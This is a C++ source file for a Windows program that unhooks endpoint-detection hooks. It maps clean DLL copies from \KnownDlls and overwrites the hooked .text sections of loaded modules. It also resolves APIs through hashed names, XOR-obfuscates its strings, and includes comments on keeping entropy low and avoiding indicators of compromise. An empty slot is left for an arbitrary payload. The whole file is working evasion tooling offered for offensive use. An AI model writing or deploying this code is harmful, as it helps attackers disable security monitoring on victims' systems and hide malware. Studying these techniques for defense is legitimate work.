#include <Windows.h>
#include <winternl.h>

#pragma comment(linker,"/ENTRY:entry")
#define DEBUG 0    // 0 disable, 1 enable
#define HASHALGO HashStringDjb2
constexpr auto CACHE = 10;

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///                                                     FUNCTION DECLRATIONS                                                    ///
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#pragma region commonmacros 

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )  
#define RVA2VA(Type, Base, Rva) (Type)((ULONG_PTR) Base + Rva)      // Credit to modexp

#define TOKENIZE( x ) #x
#define CONCAT( X, Y ) X##Y

#if DEBUG == 0
#define PRINT( STR, ... )
#else
#define PRINT( STR, ... )                                                                   \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  

#endif
#pragma endregion 

#pragma region helpers
wchar_t* _strcpy(wchar_t* dest, const wchar_t* src);

wchar_t* _strcat(wchar_t* dest, const wchar_t* src);

void _memcpy(void* dst, const void* src, SIZE_T count);

__forceinline char upper(char c);
#pragma endregion

#pragma region hashing
#pragma region HashStringDjb2
// https://github.com/vxunderground/VX-API/blob/main/VX-API/MalwareStrings.h
constexpr DWORD HashStringDjb2(const char* String)
{
    ULONG Hash = 5381;
    INT c = 0;

    while ((c = *String++)) {
        Hash = ((Hash << 5) + Hash) + c;
    }

    return Hash;
}

constexpr DWORD HashStringDjb2(const wchar_t* String)

{
    ULONG Hash = 5381;
    INT c = 0;

    while ((c = *String++)) {
        Hash = ((Hash << 5) + Hash) + c;
    }

    return Hash;
}
#pragma endregion

#pragma region HashStringFowlerNollVoVariant1a

constexpr ULONG HashStringFowlerNollVoVariant1a(const char* String)
{
    ULONG Hash = 0x811c9dc5;

    while (*String)
    {
        Hash ^= (UCHAR)*String++;
        Hash *= 0x01000193;
    }

    return Hash;
}

constexpr ULONG HashStringFowlerNollVoVariant1a(const wchar_t* String)
{
    ULONG Hash = 0x811c9dc5;

    while (*String)
    {
        Hash ^= (UCHAR)*String++;
        Hash *= 0x01000193;
    }

    return Hash;
}
#pragma endregion

inline void InitModules(void*);

void* GetProcAddrH(UINT moduleHash, UINT funcHash);

#pragma region macros
#define hash( VAL ) constexpr auto CONCAT( hash, VAL ) = HASHALGO( TOKENIZE( VAL ) );							

#define dllhash(DLL, VAL ) constexpr auto CONCAT( hash, DLL ) = HASHALGO( VAL );												

#define hashFunc( FUNCNAME , RETTYPE, ...)																\
hash( FUNCNAME ) typedef RETTYPE( WINAPI* CONCAT( type, FUNCNAME ) )( __VA_ARGS__ );								

#define API( DLL, FUNCNAME ) ( ( CONCAT( type, FUNCNAME ))GetProcAddrH( CONCAT( hash, DLL ) ,			\
CONCAT( hash,FUNCNAME ) ) )			


dllhash(KERNEL32, L"KERNEL32.DLL")
dllhash(NTDLL, L"NTDLL.DLL")


hashFunc(NtUnmapViewOfSection, NTSTATUS, HANDLE, PVOID);
hashFunc(NtProtectVirtualMemory, NTSTATUS, HANDLE, PVOID*, PULONG, ULONG, PULONG);
hashFunc(NtOpenSection, NTSTATUS, HANDLE*, ACCESS_MASK, OBJECT_ATTRIBUTES*);
hashFunc(NtMapViewOfSection, NTSTATUS, HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
hashFunc(RtlInitUnicodeString, VOID, PUNICODE_STRING, PCWSTR);
#pragma endregion 

#pragma endregion

#pragma region core
void CheckCommonlyHooked();

LPVOID RetrieveKnownDll(PWSTR name);
#pragma endregion


#pragma region random
constexpr int RandomSeed(void)
{
    return '0' * -40271 + // offset accounting for digits' ANSI offsets
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

constexpr auto KEY = RandomSeed() % 0xFF;

// https://github.com/Cih2001/String-Obfuscator
template <typename T, unsigned int N>
struct obfuscator {

    T m_data[N] = { 0 };
    
    constexpr obfuscator(const T* data) {
        for (unsigned int i = 0; i < N; i++) {
            m_data[i] = (data[i] ^ (KEY));
        }
    }

    void deobfuscate(T* des) const {
        int i = 0;
        do {
            des[i] = (m_data[i] ^ (KEY));
            i++;
        } while (des[i - 1]);
    }
};

// Use these sparingly! They can often raise the entropy
#define OBFW(str)\
    []() -> wchar_t* {\
        constexpr auto size = sizeof(str)/sizeof(str[0]);\
        constexpr auto obfuscated_str = obfuscator<wchar_t, size>(str);\
        static wchar_t original_string[size];\
        obfuscated_str.deobfuscate((wchar_t*)original_string);\
        return original_string;\
}()

#define OBFA(str)\
    []() -> char* {\
        constexpr auto size = sizeof(str)/sizeof(str[0]);\
        constexpr auto obfuscated_str = obfuscator<char, size>(str);\
        static char original_string[size];\
        obfuscated_str.deobfuscate((char*)original_string);\
        return original_string;\
}()
#pragma endregion


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///                                                         GLOBALS/STRUCTS                                                     ///
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

struct HashStruct
{
    UINT			   Hash;
    PVOID			   addr;
};

HashStruct ModuleHashes[] =
{
    { hashNTDLL ,		nullptr },
    { hashKERNEL32 ,	nullptr },
};

HashStruct HashCache[CACHE];
USHORT hashPointer;

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///                                                              ENTRY                                                          ///
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/**
* entry() - entry point for this application as it's CRT-free
*
* Entropy is around 4 for entire PE
* * .text is 5.8
* Imports[0]:
* NO IMPORTS!
* Avoid PDB file names - Linker -> Debugging -> Generate Debug Info -> No
* Potential IOC - str in RetrieveKnownDll (XOR encrypted with a random key thanks to time)
* Context: Program entry point. Must not be called again.
*
* Return:
* * 0       - All cases
*/
int entry()
{
    
    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* next = head->Flink;
    
    // Calling as requested by InitModules contest
    InitModules(head);

#if DEBUG == 1
    CheckCommonlyHooked();
#endif 



    while (next != head)
    {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((PBYTE)next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
        UNICODE_STRING* fullname = &entry->FullDllName;
        UNICODE_STRING* basename = (UNICODE_STRING*)((PBYTE)fullname + sizeof(UNICODE_STRING));

        LPVOID addr = RetrieveKnownDll(basename->Buffer);
        if (addr)
        {
            HMODULE module = (HMODULE)entry->DllBase;

            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)entry->DllBase;
            PIMAGE_NT_HEADERS nt = RVA2VA(PIMAGE_NT_HEADERS, entry->DllBase, dos->e_lfanew);

            // https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
            for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                PIMAGE_SECTION_HEADER section =
                    (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt) +
                        ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

                // strcmp will not inlined or optimized even with /O2
                // thanks to modexp for the idea
                if ((*(ULONG*)section->Name | 0x20202020) == 'xet.') {
                    ULONG dw;
                    PVOID base = RVA2VA(LPVOID, module, section->VirtualAddress);
                    ULONG size = section->Misc.VirtualSize;

                    // It's not a trivial task to make the DLL RW only especially in the case of NTDLL as we'll be using 
                    // various NT functions. PAGE_EXECUTE_READWRITE is a potential IOC.
                    // I leave that as a task to the reader to get around this.
                    // It is also worth nothing NtProtectVirtualMemory could be hooked.
                    if (NT_SUCCESS(API(NTDLL,NtProtectVirtualMemory)(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &dw))) {

                        // Replacing all the DLLs with an unhooked version is a potential IOC if EDRs scan for unhooked DLLs
                        // Consider storing the hooked .text sections encrypted in an allocated buffer and restoring when
                        //  you are done.
                        _memcpy(
                            RVA2VA(LPVOID, module, section->VirtualAddress),
                            RVA2VA(LPVOID, addr, section->VirtualAddress),
                            section->Misc.VirtualSize
                        );

                        // Restore original memory permissions
                        API(NTDLL,NtProtectVirtualMemory)(
                            NtCurrentProcess(),
                            &base,
                            &size,
                            dw,
                            &dw
                        );

                        PRINT(L"[ ] Unhooked %s from \\KnownDlls\\%s \n", basename->Buffer, basename->Buffer);
                    }
                }
            }
            // Unmap pointer as required by RetrieveKnownDll
            API(NTDLL,NtUnmapViewOfSection)(NtCurrentProcess(), addr);
        }
        next = next->Flink;
    }

#if DEBUG == 1
    CheckCommonlyHooked();
#endif

    // Do whatever you want here
    // Define API typedef with hashFunc macro and invoke using API(*)()

    return 0;
}




///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///                                                     FUNCTION DEFINITIONS                                                    ///
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#pragma region core
/**
* CheckCommonlyHooked() - Determines if 4 commonly hooked functions are hooked.
*
* Will check the opcodes of 4 commonly used functions exported by NTDLL in order to
* determine if they are hooked by compared against a previously known unhooked stub.
* 4C 8B D1  - mov r10, rcx
* B8 [SSN]  - mov eax, 18       ; EDRs will always hook before or by this instruction
* Due to the nature of processors, this will be in reverse due to endianess
*
* Context: Any context.
* Return:
* * void
*/
void CheckCommonlyHooked()
{

    HashStruct hashes[4] = {
        { hashNtProtectVirtualMemory, NULL },
        { hashNtProtectVirtualMemory, NULL },
        { hashNtMapViewOfSection, NULL },
        { hashNtOpenSection, NULL },

    };

    for (int i = 0; i < 4; i++) {
        hashes[i].addr = GetProcAddrH(hashNTDLL, hashes[i].Hash);
        if (*(ULONG*)hashes[i].addr != 0xb8d18b4c) {
            PRINT(L"[!] Hooked Function at 0x%p\n", hashes[i].addr);
        }
        else {
            PRINT(L"[-] Function Not Hooked at 0x%p\n", hashes[i].addr);
        }
    }
}

/**
* RetrieveKnownDlls() - Returns a pointer to a manually mapped KnownDll
*
* @name: Pointer to a unicode string
*
* Will attempt to open a section handle to \KnownDlls\@arg1 in order to map it.
* \KnownDlls\ is a directory of cached DLLs used to speed up loading of DLLs
* into a process at start time.
*
* Context: Any context. Expects to be unmapped once finished.
*
* Return:
* * LPVOID      - to mapped \KnownDlls\@arg1
* * NULL        - No valid \KnownDlls\ DLL was found
*/
LPVOID RetrieveKnownDll(PWSTR name)
{


    BOOL success = FALSE;
    PVOID addr = NULL;
    ULONG_PTR size = NULL;
    HANDLE section = INVALID_HANDLE_VALUE;
    UNICODE_STRING uni;
    OBJECT_ATTRIBUTES oa;
    NTSTATUS status;

    WCHAR buffer[MAX_PATH];
    _strcpy(buffer, OBFW(L"\\KnownDlls\\"));    // Potential IOC 
    _strcat(buffer, name);

    API(NTDLL,RtlInitUnicodeString)(
        &uni,
        buffer
    );
    InitializeObjectAttributes(
        &oa,
        &uni,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    if (!NT_SUCCESS(API(NTDLL,NtOpenSection)(&section, SECTION_MAP_READ, &oa)))
        goto cleanup;

    if (!NT_SUCCESS(API(NTDLL,NtMapViewOfSection)(section, NtCurrentProcess(), &addr, 0, 0, NULL, &size, 1, 0, PAGE_READONLY)))
        goto cleanup;

cleanup:
    return addr;
}
#pragma endregion

#pragma region helpers
wchar_t* _strcpy(wchar_t* dest, const wchar_t* src)
{
    wchar_t* p;

    if ((dest == NULL) || (src == NULL))
        return dest;

    if (dest == src)
        return dest;

    p = dest;
    while (*src != 0) {
        *p = *src;
        p++;
        src++;
    }

    *p = 0;
    return dest;
}

wchar_t* _strcat(wchar_t* dest, const wchar_t* src)
{
    if ((dest == NULL) || (src == NULL))
        return dest;

    while (*dest != 0)
        dest++;

    while (*src != 0) {
        *dest = *src;
        dest++;
        src++;
    }

    *dest = 0;
    return dest;
}

void _memcpy(void* dst, const void* src, SIZE_T count) {
    for (volatile int i = 0; i < count; i++) {
        ((BYTE*)dst)[i] = ((BYTE*)src)[i];
    }
}

__forceinline char upper(char c)
{
    if (c >= 'a' && c <= 'z') {
        return c - 'a' + 'A';
    }

    return c;
}
#pragma endregion

#pragma region hashing
/**
* GetProcAddrH() - Retrieve process address given the hash of a module and a corresponding function export hash
* @moduleHash: hash of module (hashMODULE)
* @funcHash: hash of the function (hashFUNCTION)
* 
* Validates that the module hash is present in the ModuleHashes structure. If so it walks the export directory 
* hashing all the names of the exports until it finds the corresponding function hash. The hash is then cached
* in the circular array HashCache which is indexed with hashPointer.
* 
* Context:  API(MODULE,FUNC) macro
*           Determing whether an address is hooked or not.
* Return:
* * void*       - pointer to exported function in specified module
* * NULL        - in event of failure
*/
void* GetProcAddrH(UINT moduleHash, UINT funcHash)
{
    void* base = nullptr;
    for (auto i : ModuleHashes) {
        if (i.Hash == moduleHash) {
            base = i.addr;
        }
    }
    if (base == NULL) {
        return NULL;
    }


    for (DWORD i = 0; i < CACHE; i++)
    {
        if (funcHash == HashCache[i].Hash) {
            return HashCache[i].addr;
        }
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY exports = RVA2VA(PIMAGE_EXPORT_DIRECTORY, base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (exports->AddressOfNames != 0)
    {
        PWORD ordinals = RVA2VA(PWORD, base, exports->AddressOfNameOrdinals);
        PDWORD names = RVA2VA(PDWORD, base, exports->AddressOfNames);
        PDWORD functions = RVA2VA(PDWORD, base, exports->AddressOfFunctions);

        for (DWORD i = 0; i < exports->NumberOfNames; i++) {
            LPSTR name = RVA2VA(LPSTR, base, names[i]);
            if (HASHALGO(name) == funcHash) {
                PBYTE function = RVA2VA(PBYTE, base, functions[ordinals[i]]);
                
                // Cache the result in a circular array
                HashCache[hashPointer % CACHE].addr = function;
                HashCache[hashPointer % CACHE].Hash = funcHash;
                hashPointer = (hashPointer + 1) % CACHE;
                
                return function;
            }
        }
    }

    return NULL;
}

/**
* InitModules() - Populate the ModuleHashes structure with the base addresses of the specified modules
* @headi1 - InMemoryOrderModuleList first entry
* 
* Populates the ModuleHashes structure with the necessary DllBases required by checking against the 
* respective module hash. Initializes the HashCache array and sets the hashPointer to 0 ready to be used.
* 
* Context: Initialization. Before any hashed APIs are called.
* 
*/
inline void InitModules(void* headi1)
{

    LIST_ENTRY* head = (LIST_ENTRY*)headi1;
    LIST_ENTRY* next = head->Flink;

    while (next != head)
    {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((PBYTE)next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));

        UNICODE_STRING* fullname = &entry->FullDllName;
        UNICODE_STRING* basename = (UNICODE_STRING*)((PBYTE)fullname + sizeof(UNICODE_STRING));

        char  name[64];
        if (basename->Length < sizeof(name) - 1)
        {
            int i = 0;
            while (basename->Buffer[i] && i < sizeof(name) - 1)
            {
                name[i] = upper((char)basename->Buffer[i]);	// can never be sure so uppercase
                i++;
            }
            name[i] = 0;
            UINT hash = HASHALGO(name);
            for (auto& i : ModuleHashes) {
                if (i.Hash == hash) {
                    i.addr = entry->DllBase;
                }
            }
        }
        next = next->Flink;
    }
    RtlSecureZeroMemory(HashCache, sizeof(HashCache));
    hashPointer = 0;
}
#pragma endregion
